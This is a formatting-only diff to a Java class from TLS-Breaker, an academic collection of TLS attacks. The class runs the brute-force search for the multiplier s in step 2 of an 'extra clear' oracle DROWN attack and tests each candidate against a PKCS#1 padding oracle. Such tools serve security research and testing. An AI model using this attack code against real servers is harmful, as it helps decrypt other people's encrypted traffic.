@@ -1,23 +1,22 @@
-/**
+/*
  * TLS-Breaker - A tool collection of various attacks on TLS based on TLS-Attacker
  *
- * Copyright 2021-2022 Ruhr University Bochum, Paderborn University, Hackmanit GmbH
+ * Copyright 2021-2024 Ruhr University Bochum, Paderborn University, and Hackmanit GmbH
  *
  * Licensed under Apache License, Version 2.0
  * http://www.apache.org/licenses/LICENSE-2.0.txt
  */
-
 package de.rub.nds.tlsbreaker.drownattack.impl.drown;
 
 import de.rub.nds.modifiablevariable.util.ArrayConverter;
 import de.rub.nds.tlsbreaker.drownattack.pkcs1.oracles.ExtraClearDrownOracle;
-
 import java.math.BigInteger;
 import java.util.concurrent.Callable;
 
 /**
- * Callable implementing the brute-force part of step 2 of an "extra clear" oracle DROWN attack: Finding a suitable
- * multiplier s and testing it both offline and using the oracle, as described in appendix A.3 of the DROWN paper.
+ * Callable implementing the brute-force part of step 2 of an "extra clear" oracle DROWN attack:
+ * Finding a suitable multiplier s and testing it both offline and using the oracle, as described in
+ * appendix A.3 of the DROWN paper.
  */
 class ExtraClearStep2Callable implements Callable<BigInteger> {
 
@@ -31,8 +30,15 @@ class ExtraClearStep2Callable implements Callable<BigInteger> {
     private BigInteger maxS;
     private BigInteger shiftedOldPlaintext;
 
-    public ExtraClearStep2Callable(ExtraClearDrownOracle oracle, byte[] shiftedOldCiphertext, int lenM, BigInteger e,
-        BigInteger modulus, BigInteger initialSCandidate, BigInteger candidateStepS, BigInteger shiftedOldPlaintext) {
+    public ExtraClearStep2Callable(
+            ExtraClearDrownOracle oracle,
+            byte[] shiftedOldCiphertext,
+            int lenM,
+            BigInteger e,
+            BigInteger modulus,
+            BigInteger initialSCandidate,
+            BigInteger candidateStepS,
+            BigInteger shiftedOldPlaintext) {
         this.oracle = oracle;
         this.shiftedOldCiphertext = shiftedOldCiphertext;
         this.lenM = lenM;
@@ -58,20 +64,26 @@ class ExtraClearStep2Callable implements Callable<BigInteger> {
                 }
 
                 candidateS = candidateS.add(candidateStepS);
-                plaintextCandidate = ArrayConverter
-                    .bigIntegerToByteArray(shiftedOldPlaintext.multiply(candidateS).mod(modulus), lenM, false);
-            } while ((plaintextCandidate.length > lenM) || (plaintextCandidate[0] != 0x00)
-                || (plaintextCandidate[1] != 0x02));
+                plaintextCandidate =
+                        ArrayConverter.bigIntegerToByteArray(
+                                shiftedOldPlaintext.multiply(candidateS).mod(modulus), lenM, false);
+            } while ((plaintextCandidate.length > lenM)
+                    || (plaintextCandidate[0] != 0x00)
+                    || (plaintextCandidate[1] != 0x02));
 
             // Online part: Check if s is really suitable using the oracle
-            byte[] ciphertextCandidate = ArrayConverter.bigIntegerToByteArray(
-                candidateS.modPow(rsaE, modulus).multiply(new BigInteger(shiftedOldCiphertext)).mod(modulus), lenM,
-                true);
+            byte[] ciphertextCandidate =
+                    ArrayConverter.bigIntegerToByteArray(
+                            candidateS
+                                    .modPow(rsaE, modulus)
+                                    .multiply(new BigInteger(shiftedOldCiphertext))
+                                    .mod(modulus),
+                            lenM,
+                            true);
             if (oracle.checkPKCSConformity(ciphertextCandidate)) {
                 return candidateS;
             }
         }
         return null;
     }
-
 }
